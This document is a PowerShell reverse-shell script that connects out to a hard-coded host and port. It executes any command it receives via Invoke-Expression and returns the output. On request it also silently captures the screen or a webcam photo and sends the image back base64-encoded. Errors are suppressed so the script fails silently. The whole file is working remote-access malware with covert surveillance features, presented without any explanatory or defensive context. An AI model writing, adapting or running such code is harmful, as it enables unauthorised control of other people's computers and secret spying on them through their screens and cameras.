# --- THE TRIPLE-LOCKED ATOMIC SHELL ---
$ip = '192.168.1.15'
$port = 4444

$c = New-Object System.Net.Sockets.TCPClient
try {
    $c.Connect($ip, $port)
    $s = $c.GetStream()
    $r = New-Object System.IO.StreamReader($s)
    $w = New-Object System.IO.StreamWriter($s)
    $w.AutoFlush = $true

    $w.WriteLine("--- !!!PRAY IT WORKS!!! ---")

    while($c.Connected) {
        $w.Write("PS " + (Get-Location).Path + "> ")
        $line = $r.ReadLine()
        if ($null -eq $line) { break }
        $cmd = $line.Trim()

        if ($cmd -eq "exit") { break }

        # --- BRANCHING ---
        if ($cmd -eq "screenshot") {
            try {
                Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp  = New-Object System.Drawing.Bitmap($rect.Width, $rect.Height)
                $g    = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
                $mem  = New-Object System.IO.MemoryStream
                $bmp.Save($mem, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $w.WriteLine([Convert]::ToBase64String($mem.ToArray()))
                $g.Dispose(); $bmp.Dispose(); $mem.Dispose()
            } catch { $w.WriteLine("Screen Error: $($_.Exception.Message)") }
        } 
        elseif ($cmd -eq "webcam") {
            try {
                # Load the type and create capture object
                [void][Windows.Media.Capture.MediaCapture, Windows.Media.Capture, ContentType=WindowsRuntime]
                $mc = New-Object Windows.Media.Capture.MediaCapture
                
                # Manual Async Wait (Initialization)
                $init = $mc.InitializeAsync()
                while ($init.Status -eq 'Started') { Start-Sleep -Milliseconds 200 }
                
                # Prepare capture
                $fmt = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
                $prep = $mc.PrepareLowLagPhotoCaptureAsync($fmt)
                while ($prep.Status -eq 'Started') { Start-Sleep -Milliseconds 200 }
                
                # Snap
                $snap = $prep.GetResults().CaptureAsync()
                while ($snap.Status -eq 'Started') { Start-Sleep -Milliseconds 200 }
                
                # Get the frame and convert to stream
                $photo = $snap.GetResults()
                $asStream = [System.IO.WindowsRuntimeStreamExtensions]::AsStreamForRead($photo.Frame)
                $ms = New-Object System.IO.MemoryStream
                $asStream.CopyTo($ms)
                
                $w.WriteLine([Convert]::ToBase64String($ms.ToArray()))
                $ms.Dispose(); $asStream.Dispose(); $mc.Dispose()
            } catch { $w.WriteLine("Webcam Error: $($_.Exception.Message)") }
        } 
        else {
            # Standard Shell
            try {
                $out = Invoke-Expression $cmd 2>&1 | Out-String
                $w.WriteLine(if($out){$out}else{"Done."})
            } catch { $w.WriteLine("Error: $($_.Exception.Message)") }
        }
    }
} catch {
    # Fail silently
} finally {
    if ($c) { $c.Close() }
}
